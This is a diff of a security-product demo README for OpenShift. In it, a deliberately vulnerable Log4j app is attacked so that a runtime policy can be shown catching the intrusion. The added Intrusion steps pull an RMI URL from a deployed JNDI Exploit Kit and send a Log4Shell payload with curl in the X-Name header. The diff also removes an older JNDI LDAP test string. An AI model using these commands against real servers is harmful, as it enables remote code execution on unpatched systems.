@@ -165,6 +165,12 @@ Deploy the vulnerable app.
 oc kustomize deployment | oc apply -f -
 ```
 
+Run the cleanup script.
+
+```
+ansible-playbook cleanup/cleanup.yaml
+```
+
 ## Demo scenario
 
 ### Build the inventory
@@ -178,7 +184,29 @@ oc kustomize deployment | oc apply -f -
 
 ### Intrusion
 
-* In a hidden terminal, run the JNDI Exploit Kit to trigger the "Shell spawned by Java application" policy
+In a hidden terminal, run the JNDI Exploit Kit to trigger the "Shell spawned by Java application" policy
+
+* Get the RMI URL with:
+
+  ```sh
+  oc logs -n exploitkit-log4j deploy/jndi-exploit-kit |grep -A1 "BYPASS WITH EL by @welk1n"
+  EXPLOIT_URL="$(oc logs -n exploitkit-log4j deploy/jndi-exploit-kit | grep -A1 "BYPASS WITH EL by @welk1n" | grep rmi:// | sed 's/\x1B\[[0-9;]\{1,\}[A-Za-z]//g')"
+  ```
+
+* Find the URL of the vulnerable container.
+
+  ```sh
+  export TARGET="https://$(oc get route settlement-app -n vulnerable-log4j -o jsonpath="{.spec.host}")/"
+  ```
+
+* Send the exploit
+
+  ```sh
+  curl "$TARGET" -H "X-Name: \${jndi:$EXPLOIT_URL}"
+  ```
+
+Then, show the violation:
+
 * Open the **Violations** tab
 * Filter by **Namespace**: `vulnerable-log4j`
 * Go to the OpenShift console
@@ -186,7 +214,7 @@ oc kustomize deployment | oc apply -f -
 * Delete the pod
 * In the Central, clear the Violation
 * Drill down to **Platform Configuration** > **System policies**
-* Open the **Log4Shell** policy
+* Open the **Shell Spawned by Java Application** policy
 * Click the **Edit** button
 * On the fourth tab, show the automatic enforcement options
 
@@ -241,20 +269,6 @@ Cleanup
 
 ```sh
 oc kustomize deployment | oc delete -f -
-oc delete pods -n vulnerable-cicd --all
+oc delete pods,builds,pipelineruns -n vulnerable-cicd --all
 oc start-build vulnerable-log4j -n vulnerable-cicd
-```
-
-## Exploit
-
-Find the URL of the vulnerable container.
-
-```sh
-export TARGET="https://$(oc get route settlement-app -n vulnerable-log4j -o jsonpath="{.spec.host}")/"
-```
-
-Go to https://log4shell.huntress.com/ and pass the generated string in the `X-Name` HTTP header.
-
-```sh
-curl "$TARGET" -H 'X-Name: ${jndi:ldap://log4shell.huntress.com:1389/e597d75d-1851-4133-9a08-d5dfd7e04264}'
 ```
